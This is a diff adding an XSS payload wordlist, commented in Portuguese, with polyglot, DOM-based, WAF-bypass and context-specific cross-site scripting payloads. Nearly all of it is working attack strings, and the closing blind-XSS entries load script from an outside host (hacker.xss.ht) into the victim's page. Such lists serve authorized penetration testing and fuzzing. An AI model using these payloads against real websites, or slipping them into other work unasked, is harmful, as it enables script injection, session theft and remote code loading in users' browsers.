@@ -1,0 +1,40 @@
+# =============================================================================
+# SUPER XSS ELITE WORDLIST
+# Payloads para Reflected, DOM e Stored XSS com Bypasses
+# =============================================================================
+
+# --- Classic & Polyglots ---
+jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0D%0A//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert()//>\x3e
+"><svg/onload=alert(1)>
+'"><script>alert(1)</script>
+"><img src=x onerror=alert(1)>
+javascript:alert(1)
+
+# --- DOM XSS Payloads ---
+#hash#<img src=x onerror=alert(1)>
+?name=<svg/onload=alert(1)>
+#javascript:alert(1)
+'-alert(1)-'
+";alert(1)//
+
+# --- WAF Bypass & Advanced ---
+<svg/onload='[1].map(alert)'>
+<details open ontoggle=alert(1)>
+<audio src/onerror=alert(1)>
+<video><source onerror=alert(1)>
+<math><mtext><option><annotation><mpath><desc><p><mglyph><action><au><script>alert(1)</script>
+<svg><animatetransform onbegin=alert(1)>
+<isindex type=image src=1 onerror=alert(1)>
+<object data="javascript:alert(1)">
+
+# --- Context Specific ---
+" onmouseover=alert(1) "
+' onmouseover=alert(1) '
+` onmouseover=alert(1) `
+javascript:confirm(1)
+<iframe src="javascript:alert(1)">
+<embed src="javascript:alert(1)">
+
+# --- Blind XSS (Exemplo de callback) ---
+'"><script src=https://hacker.xss.ht></script>
+"><img src=x onerror=import('https://hacker.xss.ht')>
